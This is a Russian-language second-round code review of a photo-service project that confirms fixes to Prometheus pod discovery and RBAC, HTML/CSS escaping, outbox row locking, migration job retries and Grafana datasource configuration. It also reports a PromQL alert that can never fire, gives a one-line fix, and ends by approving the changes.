Отдельно отмечу как правильное решение: в `analysis_errors.classify_error` добавлена
**защитная** ветка на сырую транспортную ошибку `urllib3` — второй эшелон на случай, если
какой-то путь в будущем обойдёт обёртку `ObjectStorage`.

### BLOCKING-2 — ЗАКРЫТ (вариант A, полностью)

`k8s/40-prometheus.yaml`: `static_configs` заменены на `kubernetes_sd_configs` с
`role: pod`, `namespaces: {names: [photo-service]}`, `relabel_configs` с
`action: keep` по метке `app`, подстановкой `__meta_kubernetes_pod_ip:PORT` в `__address__`
и `instance = __meta_kubernetes_pod_name`. Каждая реплика api/worker становится отдельным
target-ом с уникальным `instance` — счётчики больше не осциллируют, `rate()`/`increase()`
корректны.

RBAC добавлен и, что важно, **правильно ограничен**: `ServiceAccount: prometheus` +
namespaced `Role`/`RoleBinding` (`pods`/`endpoints`/`services`, `get/list/watch`), а не
`ClusterRole` — это строже, чем предлагал я, и согласовано с `namespaces:` в самом
`kubernetes_sd_configs`. `serviceAccountName: prometheus` проставлен в Deployment
(`40-prometheus.yaml:178`). Без этого SD молча возвращал бы пустой список targets, поэтому
пункт проверен на полноту, а не только на наличие блока.

Взято хорошее решение оставить `replicas: 2` (вариант A), а не срезать до 1 — демонстрация
C3 сохранена.

### BLOCKING-3 — ЗАКРЫТ

`web/html/js/format.js`: трюк `textContent` + `innerHTML` убран, `escapeHtml` переписана на
явную цепочку `.replace()` по пяти символам в правильном порядке (`&` первым, иначе было бы
двойное экранирование): `& < > " '`. Атрибутный контекст (`alt="..."`, `title="..."`) теперь
безопасен для произвольного `filename`.

Сверх моего требования сделано ещё лучше по `dominant_color`: добавлены
`isValidCssColor()`/`safeCssColor()` с regex `^#[0-9a-fA-F]{3,8}$`, а сам цвет больше **не
интерполируется в HTML вовсе** — `photo.js:39` рендерит пустой `<span id="dominant-color-swatch">`,
а цвет проставляется через DOM-API `swatch.style.backgroundColor` (:87). Это устраняет
CSS-инъекционный вектор целиком, а не только экранирует его.

## Закрытие MAJOR

| # | Статус | Проверка |
|---|---|---|
| **NB-1** (двойной outbox при `api replicas: 2`) | **ЗАКРЫТ** | `photo_repository.fetch_unpublished` получил `.with_for_update(skip_locked=True)`; докстринг явно объясняет, что транзакция держится до `mark_published` по всему батчу, поэтому конкурирующий поллер строки пропускает. Запрос без eager-загрузки связей, значит `FOR UPDATE` не столкнётся с outer join |
| **NB-2** (`backoffLimit: 3` у Job миграций) | **ЗАКРЫТ** | `k8s/30-migrate-job.yaml`: `backoffLimit: 10` **и** добавлен initContainer `wait-for-postgres` (TCP-проба 5432 с дедлайном 120 с на том же образе `photo-service:local`, без новых зависимостей). Теперь путь «одна команда `kubectl apply -f k8s/`» перестаёт быть ловушкой: Job не жжёт попытки, пока БД поднимается |
| **NB-3** (uid датасорса Grafana) | **ЗАКРЫТ** | `uid: Prometheus` проставлен и в `grafana/provisioning/datasources/prometheus.yml:14`, и в ConfigMap `grafana-provisioning` (`k8s/41-grafana.yaml:20`). Совпадает с `"uid": "Prometheus"` во всех 6 панелях дашборда — панели найдут датасорс в обеих средах |

## Новая находка раунда 2

**NB-13 (NON_BLOCKING, MINOR). Алерт `WorkerStalled` не может сработать никогда — несовпадение
наборов меток.** `photo-service/prometheus/rules.yml` и та же копия в `k8s/40-prometheus.yaml`:

```promql
increase(worker_messages_processed_total[10m]) == 0 and photos_pending > 0
```

Оператор `and` в PromQL требует **полного совпадения набора меток** у левой и правой части.
Левая часть — `{job="photo-worker", instance="worker-...", result="done|failed|skipped"}`
(счётчик объявлен с меткой `result`, `metrics_worker.py`), правая —
`{job="photo-api", instance="api-..."}` (`photos_pending` — Gauge без меток,
`metrics_api.py:46`, живёт в другом job по построению F4). Пересечение пустое всегда,
поэтому правило вечно возвращает пустой вектор. Это ровно тот класс дефекта, который таска
просила ловить: «правило написано, но математически не срабатывает». Дефект **не внесён
этой итерацией** — он был и в раунде 1, я его тогда пропустил; переход на per-pod SD его
не создал и не починил.

*Не блокирует*, потому что Alertmanager не подключён ни в одной среде, а критерий приёмки
требует лишь видимости правил в Prometheus UI → Alerts (правило синтаксически валидно и
будет отображаться как Inactive).

*Фикс (одна строка, в обоих файлах):*

```promql
sum(increase(worker_messages_processed_total[10m])) == 0 and sum(photos_pending) > 0
```

**NOTE к NB-1.** `with_for_update(skip_locked=True)` держит блокировки строк открытыми на
всё время публикации батча (до `OUTBOX_BATCH_SIZE = 100` сообщений в одной транзакции).
При живом продюсере, который начал таймаутить на отправке, это может дать длинную
idle-in-transaction сессию. Сценарий узкий (`ensure_started()` в начале итерации отсекает
случай «Kafka лежит целиком»), но если захочется подстраховаться — стоит уменьшить
`OUTBOX_BATCH_SIZE` или коммитить чаще.

## Итог раунда 2

Все 3 BLOCKING и все 3 MAJOR закрыты; закрыты **по существу**, а не формально — два из трёх
блокеров я перепроверил тем же способом, которым находил (прогон против закрытого порта,
чтение конфигурации SD вместе с RBAC), третий — построчным разбором с проверкой всех точек
подстановки. Гейты зелёные: ruff чист, 503 теста, +6 регрессионных именно на исправленное
поведение.

Остаются открытыми **не-блокирующие** замечания раунда 1 (NB-4…NB-12) и новое NB-13 —
их можно закрывать в следующей итерации или зафиксировать как принятый долг. Отдельно
напоминаю, что вне моего контроля остаются два гейта приёмки: реальный прогон
`test_migration_integration.py` на Postgres и живой `kubectl apply` на kind (D3).

**status: APPROVE. Открытых блокеров: 0.**
